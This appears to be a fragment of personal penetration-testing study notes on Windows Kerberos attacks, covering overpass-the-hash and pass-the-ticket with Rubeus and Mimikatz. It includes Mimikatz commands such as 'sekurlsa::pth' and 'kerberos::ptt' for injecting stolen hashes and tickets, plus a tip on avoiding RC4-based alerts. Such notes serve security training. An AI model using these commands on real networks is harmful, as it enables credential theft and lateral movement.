...
## Rubeus
- can dump straight to stdout - gives a base64 encoed string for the ticket
```Markdown
...
- converts hash/key for a domain-joined user into a full TGT
...
<SNIP>
```
- need access to the aes256_hmac and rc4_hmac keys
  
- once we have that, we can execute the attack
```Markdown
sekurlsa::pth /domain:<DOMAIN> /user:<user> /ntlm:<hash>
```
- this will create a new cmd window that we can use to request access to any service for the context user
  
  
## Rubeus
- DOES NOT require administrator
    
    - but you need to get the RC4/AES which requires mimikatz (i think)
...
# Pass the Ticket (PtT)
- either of the below methods (rc4, base64 ticket) are used to import the ticket → then we can move laterally
- using rc4 can cometimes trigger an alert for using an older encryption method, so best to try the ticket first
## RC4
- this RC4 is retrieved from asktgt using Rubeus or pth with Mimikatz
```Markdown
...
## Importing .krbi to Base64 Ticket
...
```Markdown
privilege::debug
kerberos::ptt "C:\path\to\.kirbi"
exit
# Open a PowerShell session, then enter a remote powershell
# session using ticket
powershell
...
[+] LUID            : 0xe07648
```
- this will open a new cmd window, which we use to execute Rubeus to request a new TGT with /ptt to import the ticket into our new session
